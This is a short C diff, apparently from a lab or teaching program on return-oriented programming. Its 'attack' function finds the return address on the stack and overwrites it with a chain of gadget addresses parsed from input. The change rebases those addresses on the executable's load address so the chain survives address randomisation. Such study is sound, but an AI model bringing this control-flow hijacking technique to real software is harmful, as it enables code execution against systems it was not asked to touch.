@@ -3,6 +3,8 @@
 #include <stdlib.h>
 #include <string.h>
 
+extern char __executable_start;
+
 unsigned int telephone(unsigned int n) {
   unsigned int result = 0;
 
@@ -48,10 +50,10 @@ void attack(char* stack) {
   int i = 0;
   while (buffer[i] != (size_t) __builtin_return_address(0)) i++;
   char* token = strtok(stack, "|");
-  printf("ROP CHAIN:\n-> ");
+  printf("ROP CHAIN:\n");
   while (token != NULL) {
-    buffer[i] = (size_t) strtol(token, NULL, 16);
-    printf("%p: %p\n   ", buffer+i, (void*) buffer[i]);
+    buffer[i] = (size_t) (strtol(token, NULL, 16) + &__executable_start);
+    printf("%p: %p\n", buffer+i, (void*) buffer[i]);
     token = strtok(NULL, "|");
     i++;
   }
